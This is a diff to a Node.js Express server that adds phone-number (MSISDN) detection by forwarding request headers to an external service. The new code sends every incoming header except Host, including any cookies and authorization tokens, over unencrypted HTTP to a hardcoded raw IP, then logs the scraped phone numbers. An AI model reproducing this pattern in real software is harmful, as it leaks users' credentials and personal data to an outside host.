@@ -1,6 +1,7 @@
 const express = require('express');
 const path    = require('path');
 const https   = require('https');
+const http    = require('http');
 const crypto  = require('crypto');
 
 // Load environment variables relative to the script directory
@@ -224,11 +225,64 @@ async function getBimaToken(forceRefresh = false) {
     return bimaTokenCache;
 }
 
+function httpRequestExternal(options, postBody) {
+    return new Promise((resolve, reject) => {
+        const req = http.request(options, (res) => {
+            const chunks = [];
+            res.on('data', chunk => chunks.push(chunk));
+            res.on('end', () => {
+                const raw = Buffer.concat(chunks).toString('utf8');
+                resolve({ status: res.statusCode, body: raw });
+            });
+        });
+        req.on('error', reject);
+        req.setTimeout(5000, () => {
+            req.destroy();
+            reject(new Error('Request timeout'));
+        });
+        if (postBody) req.write(postBody);
+        req.end();
+    });
+}
+
 /* ──────────────────────────────────────────────────────────────────
    PROXY 1.5: Detect MSISDN from headers (Mobile Data Enrichment)
    GET /api/detect-msisdn
    ────────────────────────────────────────────────────────────────── */
-app.get('/api/detect-msisdn', (req, res) => {
+app.get('/api/detect-msisdn', async (req, res) => {
+    // 1. Forward request headers to external detector site
+    const headers = {};
+    for (const key in req.headers) {
+        if (key.toLowerCase() !== 'host') {
+            headers[key] = req.headers[key];
+        }
+    }
+
+    try {
+        // 2. Fetch the HTML from the external site
+        const externalResult = await httpRequestExternal({
+            hostname: '54.154.2.113',
+            port: 8000,
+            path: '/',
+            method: 'GET',
+            headers: headers
+        });
+
+        if (externalResult.status === 200 && typeof externalResult.body === 'string') {
+            // 3. Extract the MSISDN from the HTML content (search for id="msisdn-val">03...)
+            const match = externalResult.body.match(/id=["']msisdn-val["'][^>]*>([^<]+)</);
+            if (match && match[1]) {
+                const detectedMsisdn = match[1].trim();
+                console.log(`[Node.js HE] External site detected MSISDN: ${detectedMsisdn}`);
+                return res.json({ msisdn: detectedMsisdn });
+            }
+        }
+    } catch (err) {
+        console.error('[Node.js HE] Error fetching from external detector:', err);
+    }
+
+    // Fallback to local check
+    console.log('[Node.js HE] External check failed/returned no MSISDN. Falling back to local headers...');
     const headerKeys = [
         'x-msisdn',
         'x-up-calling-line-id',
@@ -247,7 +301,7 @@ app.get('/api/detect-msisdn', (req, res) => {
     for (const key of headerKeys) {
         const val = req.headers[key] || req.headers[key.toLowerCase()];
         if (val) {
-            console.log(`[Node.js Auto-Fetch] Found MSISDN in header '${key}': ${val}`);
+            console.log(`[Node.js Auto-Fetch] Found MSISDN in local header '${key}': ${val}`);
             return res.json({ msisdn: val.toString().trim() });
         }
     }
